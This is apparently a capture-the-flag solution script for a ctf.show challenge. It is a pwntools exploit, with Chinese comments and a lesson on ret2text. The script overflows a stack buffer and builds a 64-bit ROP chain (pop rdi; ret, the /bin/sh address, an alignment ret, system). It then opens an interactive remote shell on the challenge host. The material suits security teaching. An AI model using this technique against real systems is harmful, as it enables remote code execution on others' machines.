from pwn import *

p = remote("pwn.challenge.ctf.show", "28117")

# rdi_ret_addr = 0x4007e3：pop rdi; ret gadget的地址
# 用于将/bin/sh地址加载到rdi寄存器（64位函数调用第一个参数通过rdi传递）
# 通过ROPgadget --binary=pwn40 grep "pop rdi; ret" 找到
rdi_ret_addr = 0x4007e3

# bin_sh_addr = 0x400808：/bin/sh字符串的地址
# 通过IDA搜索字符串找到的"/bin/sh"地址
bin_sh_addr = 0x400808

# system_addr = 0x400520：system函数的地址
# 通过IDA分析程序找到的system函数地址
system_addr = 0x400520

# ret_addr = 0x4004fe：ret指令的地址
# 用于栈对齐（64位Linux要求函数调用时栈16字节对齐）
# 通过ROPgadget --binary=pwn40 grep "ret" 找到
ret_addr = 0x4004fe

# payload构造分析：
# 'a' * (0xA+0x8)：填充到返回地址位置
# 0xA：缓冲区到saved rbp的距离
# 0x8：saved rbp的大小（64位程序）
# p64(rdi_ret_addr)：执行pop rdi; ret，将下一个值弹出到rdi寄存器
# p64(bin_sh_addr)：被pop到rdi寄存器，作为system的第一个参数
# p64(ret_addr)：执行ret指令，调整栈对齐
# p64(system_addr)：跳转到system函数执行
# 64位调用约定：system("/bin/sh") 中 "/bin/sh" 通过rdi传递
payload = 'a' * (0xA+0x8) + p64(rdi_ret_addr) + p64(bin_sh_addr)  + p64(ret_addr) +  p64(system_addr)

p.sendline(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 64位程序 + ROP链
2. 64位函数调用约定：
   - 第一个参数通过 rdi 寄存器传递
   - 第二个参数通过 rsi 寄存器传递
   - 第三个参数通过 rdx 寄存器传递
3. ROP (Return Oriented Programming)：
   - 利用程序中已有的代码片段（gadgets）来构造攻击链
   - pop rdi; ret 是一个常见gadget，用于给rdi赋值
4. payload结构分析：
   'a' * (0xA+0x8)     - 填充到返回地址
   + p64(rdi_ret_addr) - pop rdi; ret gadget，将bin_sh_addr弹出到rdi
   + p64(bin_sh_addr)  - /bin/sh字符串地址，作为system的参数
   + p64(ret_addr)     - ret指令，用于栈对齐（64位要求16字节对齐）
   + p64(system_addr)  - system函数地址
5. 为什么需要ret_addr？
   - 64位Linux要求函数调用时栈16字节对齐
   - 执行call指令时，返回地址入栈，栈偏移8字节
   - 通过插入一个ret gadget来调整栈对齐
6. gadget查找：使用ROPgadget工具或pwntools的ROP类
"""
